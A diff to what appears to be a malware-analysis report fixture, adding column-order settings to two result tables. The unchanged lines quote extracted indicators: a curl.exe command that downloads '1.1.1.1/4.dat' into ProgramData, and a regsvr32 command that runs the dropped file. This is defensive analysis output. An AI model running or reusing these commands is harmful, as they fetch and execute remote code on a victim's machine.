@@ -6,6 +6,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"LOLBAS\": \"regsvr32\", \"Command\": \"regsvr32 \\\"C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos\\\"\"}]",
+        "body_config": {
+          "column_order": [
+            "LOLBAS",
+            "Command"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -24,6 +30,13 @@
       {
         "auto_collapse": false,
         "body": "[{\"URL\": \"1.1.1.1/4.dat\", \"Destination\": \"C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos\", \"Command\": \"curl.exe -o C:\\\\ProgramData\\\\Pterds\\\\HErtop.pos 1.1.1.1/4.dat\"}]",
+        "body_config": {
+          "column_order": [
+            "URL",
+            "Destination",
+            "Command"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
